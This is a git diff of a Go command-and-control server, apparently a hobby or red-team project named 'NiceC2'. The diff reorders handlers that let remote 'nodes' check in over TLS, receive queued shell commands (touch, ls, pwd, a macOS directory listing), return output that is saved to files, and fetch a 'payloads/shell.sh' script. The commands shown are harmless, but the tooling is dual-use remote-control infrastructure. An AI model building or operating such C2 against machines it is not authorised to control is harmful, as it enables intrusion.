@@ -7,11 +7,12 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"strconv"
-	"strings"
 	"time"
 )
 
+// Banner for the application
 const banner string = `
 
 ███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
@@ -28,13 +29,11 @@ const banner string = `
 // It should never be bellow 0
 var taskID int = 1
 
-// type Command struct {
-// 	CommandID string `json:"CommandID"`
-// 	NodeID    string `json:"NodeID"`
-// 	Action    string `json:"Action"`
-// 	Content   string `json:"Command"`
-// 	Progress  string `json:"Progress"`
-// }
+// The main array of all nodes that have checked in.
+var nodes []node = read_nodes_from_file()
+
+// The array holding the queue of tasks
+var task_queue []Task
 
 type Task struct {
 	TaskID   string
@@ -64,11 +63,37 @@ type node struct {
 	Last_Check_In  string
 }
 
-// The main array of all nodes that have checked in.
-var nodes []node = read_nodes_from_file()
+func main() {
 
-var task_queue []Task
+	// Make some hard coded tasks
+	task_queue = append(task_queue, create_task("NodeName", "run", "This Command"))
+	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touchsd HelloThere"))
+	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere1"))
+	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere2"))
+	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "ls"))
+	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "pwd"))
+	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "ls /System/DriverKit/Runtime/System/Library/Frameworks/Kernel.framework/Resources"))
 
+	fmt.Println("The current task queue")
+	fmt.Println(task_queue)
+	fmt.Println()
+	fmt.Println()
+
+	handleRequests()
+
+}
+
+// Api endpoints and stuff
+func handleRequests() {
+
+	http.HandleFunc("/checkin", nodeCheckIn)
+	http.HandleFunc("/node_response", node_response)
+	// http.HandleFunc("/getPayload", getPayload)
+
+	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
+}
+
+// Function for that runs each time the node checks in
 func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
 	var blank_response = string(`
@@ -113,13 +138,6 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
 	fmt.Println("============= ----------- =============")
 
-	// response := "Hello World"
-
-	// Send the response back
-	// fmt.Fprintf(w, `{"message": "hello world"}`)
-
-	// var response string
-
 	// Find that nodes task
 	Task_location, find_task_message := find_task_unsent(node_that_checked_in.ID)
 
@@ -146,39 +164,7 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 	save_nodes_to_file()
 }
 
-func nodeSendFile(w http.ResponseWriter, req *http.Request) {
-
-	// Decode the json body
-	decoder := json.NewDecoder(req.Body)
-	var node check_in
-	err := decoder.Decode(&node)
-	if err != nil {
-		panic(err)
-	}
-
-	script := read_script("payloads/shell.sh")
-
-	var response = []byte(`
-	{
-		"ID": "` + node.ID + `",
-		"command": "File",
-		"details": "` + script + `"
-	}`)
-
-	// Sending the reponse
-	fmt.Fprintf(w, string(response))
-
-}
-
-func handleRequests() {
-
-	http.HandleFunc("/checkin", nodeCheckIn)
-	http.HandleFunc("/node_response", node_response)
-	// http.HandleFunc("/getPayload", getPayload)
-
-	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
-}
-
+// Handles when a node sends back the result of a task (Command output)
 func node_response(w http.ResponseWriter, req *http.Request) {
 
 	fmt.Println("A TASK HAS BEEN COMPLETED!!!!!s")
@@ -209,38 +195,55 @@ func node_response(w http.ResponseWriter, req *http.Request) {
 
 	task_queue[task_location].Progress = response_to_task.Progress
 
+	fmt.Println(response_to_task.Result)
+
+	// Write result to file. Temporary measure
+	f, err := os.Create(response_to_task.TaskID + ".txt")
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	defer f.Close()
+
+	_, err2 := f.WriteString(response_to_task.Result + "\n")
+
+	if err2 != nil {
+		log.Fatal(err2)
+	}
+
+	fmt.Println("done")
+
 	fmt.Println()
 
 }
 
-func main() {
+// Handles gathering a file for the node to recieve
+func nodeSendFile(w http.ResponseWriter, req *http.Request) {
 
-	// Make some hard coded tasks
-	task_queue = append(task_queue, create_task("NodeName", "run", "This Command"))
-	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touchsd HelloThere"))
-	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere1"))
-	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere2"))
+	// Decode the json body
+	decoder := json.NewDecoder(req.Body)
+	var node check_in
+	err := decoder.Decode(&node)
+	if err != nil {
+		panic(err)
+	}
 
-	fmt.Println("The current task queue")
-	fmt.Println(task_queue)
-	fmt.Println()
-	fmt.Println()
+	script := read_script("payloads/shell.sh")
 
-	handleRequests()
+	var response = []byte(`
+	{
+		"ID": "` + node.ID + `",
+		"command": "File",
+		"details": "` + script + `"
+	}`)
+
+	// Sending the reponse
+	fmt.Fprintf(w, string(response))
 
 }
 
-func refresh_commands() string {
-
-	//Reading the command file, this will be JSON at some point I reckon
-
-	bFile, _ := ioutil.ReadFile("command.txt")
-	command := string(bFile)
-	command = strings.Replace(command, "\n", "", -1)
-
-	return command
-}
-
+// Reads and encodes a script. Read to send to the node
 func read_script(path string) string {
 
 	// Read the file
